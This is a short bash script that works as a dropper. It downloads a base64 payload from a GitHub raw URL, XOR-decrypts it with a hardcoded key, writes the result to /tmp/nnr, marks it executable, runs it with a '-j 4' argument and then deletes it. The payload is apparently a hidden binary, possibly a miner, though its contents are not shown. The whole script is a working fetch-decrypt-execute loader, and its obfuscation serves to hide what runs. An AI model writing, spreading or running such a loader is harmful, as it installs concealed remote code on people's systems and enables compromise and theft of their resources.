#!/bin/bash

_xor_decrypt() {
    local data="$1"
    local key="$2"
    python3 -c "
import base64, sys
data = base64.b64decode('$data')
key = '$key'
decrypted = bytes([data[i] ^ ord(key[i % len(key)]) for i in range(len(data))])
sys.stdout.buffer.write(decrypted)
" 2>/dev/null
}

_PAYLOAD=$(curl -sL https://raw.githubusercontent.com/popowana/clever-phoenix-960/refs/heads/main/payload.txt)

if [ -z "$_PAYLOAD" ]; then
    echo "Error: Failed to download payload"
    exit 1
fi

echo "Payload downloaded successfully"
_xor_decrypt "$_PAYLOAD" "kembang" > /tmp/nnr
if [ ! -f /tmp/nnr ]; then
    echo "Error: Failed to create /tmp/nnr"
    exit 1
fi

SIZE=$(stat -c%s /tmp/nnr 2>/dev/null || stat -f%z /tmp/nnr 2>/dev/null)
if [ "$SIZE" -eq 0 ]; then
    echo "Error: /tmp/nnr is empty (decryption failed)"
    exit 1
fi

echo "Binary size: $SIZE bytes"

chmod +x /tmp/nnr

if [ ! -x /tmp/nnr ]; then
    echo "Error: Failed to make /tmp/nnr executable"
    exit 1
fi

echo "Executing"
/tmp/nnr -j 4


EXIT_CODE=$?
if [ $EXIT_CODE -eq 0 ]; then
    echo "nnr executed successfully (exit code: 0)"
else
    echo "nnr failed with exit code: $EXIT_CODE"
fi

rm -f /tmp/nnr
